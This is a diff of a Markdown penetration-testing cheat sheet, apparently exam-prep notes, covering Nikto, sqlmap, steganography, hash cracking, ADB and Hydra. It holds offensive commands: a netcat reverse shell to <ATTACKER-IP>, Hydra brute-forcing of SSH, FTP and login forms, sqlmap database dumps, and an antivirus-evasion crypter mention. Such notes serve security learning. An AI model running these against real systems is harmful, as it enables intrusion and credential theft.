@@ -2,7 +2,7 @@
 
 [Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)
 
-<details><summary><b> ⏬ Recon </b></summary>
+<details><summary><h4> ⏬ Recon </h4></summary>
   
   ##### via Web
   - [Tor Browser](https://www.torproject.org/download/)
@@ -117,15 +117,9 @@
   ````
   #find out if running service with nmap/metasploit(rdp_scanner)
   #brute force with hydra
-  #use xfreerdp for gui login
+  #use xfreerdp for gui login or use remmina
   ````
-- bruteforcing
-  ````
-  hydra -L user.txt -P pass.txt smb://10.10.10.4
-  L =  logging file name
-  P = Passwords file name
-  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
-  ````
+  
 - AD Explorer (LDAP)
   ````
   or with nmap
@@ -150,6 +144,9 @@
   wpscan -u 10.10.. -e u vp
   wpscan -u 10.10.. -e u --wordlist path/rockyou.txt        #bruteforce
   #-e : enumerate      #-u : enumerate usernames       #-vp : vulnerable plugins
+
+  #rlogin
+  rlogin -l user <TARGET-IP>        #Allows a user to log in without a password if .rhosts is misconfigured.
   
   #wordlist generation
   cewl -w wordlist -d 2 -m 5 http://wordpress.com
@@ -159,30 +156,47 @@
   ````
 
 #### Vulnerability scanning
-- openVAS | greenbone
-- Tenable Nessus
+- openVAS | greenbone ~ Install `apt install openvas -y` , Start `gvm-setup` / `gvm-start`
+- Tenable Nessus `systemctl start nessusd`
 - NIST
 - CVE org (https://www.cve.org)
-- nikto `nikto -h url -Cgidirs all`
+- <details><summary>Nikto</summary></summary>
+
+  ````bash
+    nikto -h <TARGET-IP>        #basic
+    nikto -h <TARGET-IP> -p 443,8080,8443      #Specific Ports
+    nikto -h https://<TARGET-IP>          #https scan
+    nikto -h <TARGET-IP> -useragent "Mozilla/5.0"         #Mimics a real browser.
+    nikto -h <TARGET-IP> -o scan_results.txt          #output
+    nikto -h <TARGET-IP> -o results.html -Format html
+    nikto -h <TARGET-IP> -useproxy http://127.0.0.1:8080        #Proxyscan
+    nikto -h <TARGET-IP> -mutate 2 -mutate-options my_wordlist.txt          #custom payload
+    nikto -h url -Cgidirs all           #to scan all known CGI directories 
+    nikto -h <TARGET-IP> -Tuning <value>        #specific vuln scan
+    <value>  → 0 (default), 1,2 (Interesting & index files) 4,5,9 (XSS &SQLi) , 6,7 (RCE & File Upload), 3 (Misconfig), 9(Full or aggressive)
+  ````
+</details>
 
 #### Stegnography
 - steghide
     ````bash
+    steghide extract -sf new.jpeg      #This will exctract the hidden file
     steghide embed -ef abc -cf web.jpeg -sf new.jpeg -e none -p 123
     ef = embedded file      #abc is a text file in this example
     cf = cover file      #web.jpeg is a image file
     sf = stegno file      #new.jpeg is a stego created new file
     e = encryption
     p = password
-    steghide extract -sf new.jpeg      #This will exctract the hidden file
+    
     ````
 - openstego GUI tool (https://github.com/syvaidya/openstego/releases)
 - stegosuite
 - SNOW
   ````js
+  //find or look for snow tool path
   SNOW.EXE -C -p 1234 output.txt   // For extracting the hidden message
   
-  // Options Available in SNOW
+  //Options available in SNOW
     -C Compress the data if concealing, or uncompress it while extracting.
     -Q Quiet mode, If not set means the application will report statistics such as compression percentage and amount of storage available.
     -S Report on the approximate amount of space available for a hidden message in the text file. Line length is taken into account, but other options are ignored.
@@ -191,7 +205,7 @@
     -f Content of the file will get concealed in the input file.
     -m Message String The content written in this flag will be concealed into the input file.
 
-  // Example
+  //Example
     Open the uncompressed file.
     Run the SNOW.exe file.
     Open CMD and reach the file that you want to hide the message within.
@@ -267,9 +281,10 @@ sqlmap -u 10.10.77.169 --forms --dump
 - --dump= dump dthe database data entries
 
 // extract database
+sqlmap -u <url> --cookie <cookie> --dbs
 sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
 // extract colums
-Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
+Sqlmap -u http://localchost.com/hey.php?artist=1 --D databasname --T artists --columns
 // extract data of the table and the column inside of the db
 sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
 ````
@@ -365,14 +380,13 @@ If you have Meterpreter access:
   meterpreter > help
 ````
 > How to Fix the Vulnerability?
-  >> Sanitize input: Use escapeshellcmd() and escapeshellarg().
-
-  >> Whitelist commands: Only allow specific inputs.
-
-  >> Use prepared statements: Avoid direct execution of user input.
+> > Sanitize input: Use escapeshellcmd() and escapeshellarg().  
+> > Whitelist commands: Only allow specific inputs.  
+> > Use prepared statements: Avoid direct execution of user input.  
 </details>
 
-#### Netcat Reverse Shell
+#### System Hacking
+##### Netcat Reverse Shell
 Attacker (Listener)
   ```
   nc -lvnp 4444
@@ -382,24 +396,25 @@ Victim (Windows/Linux)
   nc -e /bin/bash <ATTACKER-IP> 4444
   ```
 
-#### Theef
+##### Theef
   > Server exe need to be run on victim and client exe on Attacker
 
-#### Payload detect via Anti-malware / Anti-Virus
-- Virus Total
-- Hybrid Analysis
+#### Malware Analysis
+- [Virus Total](https://www.virustotal.com/gui/home/search)
+- [Hybrid Analysis](https://www.hybrid-analysis.com/)
 - Antiscan.me
+- DIE Tool `die /path/to/binary.exe` or `diec /path/to/binary`
   
  > swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.
 
 #### Cryptography
 
-Symmetric Encryption: Use same key for Encryption and decryption
-
-Asymmetric Encryption: Use Public/Private for Encryption and Decryption
+> Symmetric Encryption: Use same key for Encryption and decryption  
+> Asymmetric Encryption: Use Public/Private for Encryption and Decryption
 
 ##### Hashing/decoding
-To find the password of a ZIP file
+<details><summary>To find the password of a ZIP file</summary>
+  
 ````bash
   fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>
   #-v → Verbose mode (show progress).
@@ -414,18 +429,22 @@ To find the password of a ZIP file
   #If the ZIP uses weak encryption (pkzip format), you might be able to extract files without a password:
     unzip -P "" <zipfile.zip>
 ````
+</details>
+
 To decrypt (crack) a hashed password:
-- Online:
+- <details><summary>Online:</summary>
 
-| **Website** | **Supports (MD5, SHA1, NTLM, etc.)** | **Notes** |
-|-------------|---------------------------------|-----------|
-|[CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Large precomputed database (rainbow tables) |
-|[Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Free + premium cracking, community-driven |
-|[OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Supports **offline cracking** (upload files) |
-|[MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup for common hashes |
-|[CMD5](https://www.cmd5.com/) | MD5, SHA1, SHA256, MySQL | Good for **NTLM & MySQL** hashes |
+    | **Website** | **Supports (MD5, SHA1, NTLM, etc.)** | **Notes** |
+    |-------------|---------------------------------|-----------|
+    |[CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Large precomputed database (rainbow tables) |
+    |[Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Free + premium cracking, community-driven |
+    |[OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Supports **offline cracking** (upload files) |
+    |[MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup for common hashes |
+    |[CMD5](https://www.cmd5.com/) | MD5, SHA1, SHA256, MySQL | Good for **NTLM & MySQL** hashes |
+  </details>
 
-- Locally:
+- <details><summary>Locally:</summary>
+
   - Identify the Hash Type
     ```
     hashid hash.txt
@@ -452,6 +471,7 @@ To decrypt (crack) a hashed password:
     cat hash.txt | base64 -d
     ```
   If the hash is common (MD5, SHA1, NTLM), rockyou.txt is usually enough to crack it!
+</details>
 
 - GUI Applications
   - Hash Calc (window based tool)
@@ -459,11 +479,22 @@ To decrypt (crack) a hashed password:
   - Cryptoforge
       - Not a free application
       - We can lock/encypt a file/folder with the password
-  - Encrypt/Decrypt data with BCTTextEncoder
-  
+  - <details><summary>Encode/Decode data with BCTTextEncoder</summary>
+ 
+      - Download BCTextEncoder from the official site or trusted sources.
+      - Run BCTextEncoder.exe (No installation required).
+      - In the "Input Text" box, enter the message you want to encrypt.
+      - Check "Use Password" and enter a strong password.
+      - Click "Encode".
+      - The encrypted text appears in the "Output Text" box.
+      - Paste the encrypted message into the "Input Text" box.
+      - Enter the decryption password (same as the one used for encryption).
+      - Email or send the encrypted text securely.
+    </details>
 ##### Disk Encryption
   - Bitlocker
-  - Veracrypt (https://veracrypt.eu/en/Downloads.html)
+  - <details><summary>Veracrypt (https://veracrypt.eu/en/Downloads.html)</summary>
+
     - after installing/opening application , create a volume
     - Choose an encrypted file container/ Non-system drive / entire drive
     - Select standard and location for this file
@@ -472,6 +503,47 @@ To decrypt (crack) a hashed password:
     - Move the cursor for more complexity of encryption
     - Finish the setup
     - Now agin start the veracrypt application and select the output file and we can attach/mount it as a 'New Volumn'.
+</details>
 
+##### Android Hacking
+
+<details><summary><b>A</b>ndroid <b>D</b>ebug <b>B</b>ridge</summary> We need this application here, and android victim must be in debug-mode
+  
+````bash
+  apt-get update
+  sudo apt-get install adb -y
+  adb devices -l
+  adb connect <ip>
+  adb shell
+  $cd /path     //find folder
+  $adb pull sdcard/test.txt /home/userr/Desktop
+````
+
+With Phonesploit
+- Download and install this application from github
+- python3 phonesploit.py
+- use options to view/connect/download accordingly
+</details>
+
+<details><summary><h4>Hydra</h4></summary>
+
+  ````
+  hydra -L user.txt -P pass.txt smb://10.10.10.4
+  L =  logging file name
+  P = Passwords file name
+  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
+
+hydra -l username -P passlist.txt 192.168.0.100 ssh            #SSH
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100            #FTP
+
+#If the service isn't running on the default port, use -s
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+
+hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet      #TELNET
+
+# Login form
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
+  ````
+</details>
 
 #### More
